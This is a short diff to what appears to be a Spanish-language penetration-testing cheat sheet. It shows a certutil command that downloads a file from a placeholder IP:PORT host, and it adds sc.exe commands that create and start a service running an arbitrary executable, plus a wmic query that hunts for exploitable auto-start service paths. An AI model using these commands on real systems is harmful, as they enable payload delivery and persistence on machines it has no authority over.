@@ -243,6 +243,12 @@ Descargar archivos con certutil:
 certutil -urlcache -split -f http://IP:PORT/file
 
 
+Crear servicio(sc.exe): No me funciona
+sc.exe create nombre binPAth= path\script.exe DisplayName= nombre 
+sc.exe start nombre 
+wmic.exe service get name,displayname,pathname,startmode|findstr /i "auto" |findstr /i /v "c:windows"|findstr /i /v "''"|select-string nombre 
+
+
 
 Active Directory(AD)
 
